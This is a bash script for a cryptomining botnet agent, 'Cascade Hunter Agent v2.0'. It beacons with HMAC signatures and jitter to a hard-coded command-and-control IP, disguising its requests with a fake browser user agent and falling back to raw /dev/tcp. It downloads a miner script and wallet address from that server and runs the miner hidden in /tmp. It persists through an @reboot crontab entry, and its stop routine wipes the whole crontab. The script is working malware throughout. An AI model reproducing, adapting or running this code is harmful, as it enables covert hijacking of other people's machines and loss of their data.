#!/bin/bash
# Cascade Hunter Agent v2.0 (TLS + HMAC + Jitter support)
# Auto-deploy miner with persistence and wallet rotation awareness

C2_HOST="${C2_HOST:-151.240.157.27}"
C2_PORT="${C2_PORT:-9001}"
C2_SCHEME="${C2_SCHEME:-http}"
BEACON_PREFIX="${BEACON_PREFIX:-l5t0y2}"
HMAC_SECRET="${HMAC_SECRET:-1a7cfc7409da0304d3096fe1bf5c7410b075ade16da2f50ed65bf83bbdbf075c}"
BEACON_JITTER="${BEACON_JITTER:-30}"

bot_id="hunter_$(cat /proc/sys/kernel/hostname 2>/dev/null | md5sum | cut -c1-12)_$(id -u)"
MINER_SCRIPT="/tmp/.cascade_mine.sh"
MINER_BIN="/tmp/.cache/xmrig"
PID_FILE="/tmp/.cascade_mine.pid"

beacon_sig() {
    local payload="$1"
    if [[ -n "$HMAC_SECRET" ]]; then
        echo -n "$payload" | openssl dgst -sha256 -hmac "$HMAC_SECRET" | awk '{print $2}'
    fi
}

beacon() {
    local event="$1"
    local info="$2"
    local sig=$(beacon_sig "$bot_id:$event:$info")
    if [[ -n "$BEACON_JITTER" && "$BEACON_JITTER" -gt 0 ]]; then
        sleep $((RANDOM % BEACON_JITTER))
    fi
    local url="$C2_SCHEME://$C2_HOST:$C2_PORT/${BEACON_PREFIX}beacon?id=$bot_id&n=$event&i=$info&sig=$sig"
    if command -v curl &>/dev/null; then
        curl -sf --max-time 5 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0" "$url" 2>/dev/null
    elif command -v wget &>/dev/null; then
        wget -q -O - --timeout=5 --user-agent="Mozilla/5.0" "$url" 2>/dev/null
    else
        if [[ -e /dev/tcp/$C2_HOST/$C2_PORT ]]; then
            exec 3<>/dev/tcp/$C2_HOST/$C2_PORT
            echo -e "GET /${BEACON_PREFIX}beacon?id=$bot_id&n=$event&i=$info&sig=$sig HTTP/1.0\r\nHost: $C2_HOST:$C2_PORT\r\n\r\n" >&3
            cat >&3
            exec 3>&-
        fi
    fi
}

fetch_wallet() {
    local url="$C2_SCHEME://$C2_HOST:$C2_PORT/wallet"
    if command -v curl &>/dev/null; then
        curl -sf --max-time 5 "$url" 2>/dev/null | grep -o '"active_address":"[^"]*"' | cut -d'"' -f4
    elif command -v wget &>/dev/null; then
        wget -q -O - --timeout=5 "$url" 2>/dev/null | grep -o '"active_address":"[^"]*"' | cut -d'"' -f4
    fi
}

deploy_miner() {
    local wallet="${1:-$(fetch_wallet)}"
    if [[ -z "$wallet" ]]; then
        echo "[!] No wallet available from C2" >&2
        return 1
    fi
    local miner_url="$C2_SCHEME://$C2_HOST:$C2_PORT/miner"
    if command -v curl &>/dev/null; then
        curl -sfL --max-time 10 "$miner_url" -o "$MINER_SCRIPT" 2>/dev/null
    elif command -v wget &>/dev/null; then
        wget -q -O "$MINER_SCRIPT" --timeout=10 "$miner_url" 2>/dev/null
    fi
    if [[ ! -f "$MINER_SCRIPT" ]]; then
        echo "[!] Failed to fetch miner script" >&2
        return 1
    fi
    chmod +x "$MINER_SCRIPT"
    WALLET="$wallet" nohup bash "$MINER_SCRIPT" "$wallet" >/dev/null 2>&1 &
    echo $! > "$PID_FILE"
    echo "@reboot bash $MINER_SCRIPT $wallet" | crontab - 2>/dev/null
    echo "[+] Miner deployed with wallet: ${wallet:0:12}..."
}

run() {
    beacon "startup" ""
    deploy_miner
    while true; do
        beacon "heartbeat" ""
        interval=$((60 + RANDOM % 120 + RANDOM % BEACON_JITTER))
        sleep $interval
    done
}

case "${1:-run}" in
    run) run ;;
    mine) deploy_miner "$2" ;;
    wallet) fetch_wallet ;;
    stop)
        if [[ -f "$PID_FILE" ]]; then
            kill $(cat "$PID_FILE") 2>/dev/null
            rm -f "$PID_FILE" "$MINER_SCRIPT" "$MINER_BIN"
            crontab -r 2>/dev/null
            echo "[+] Hunter stopped and cleaned up"
        fi
        ;;
esac
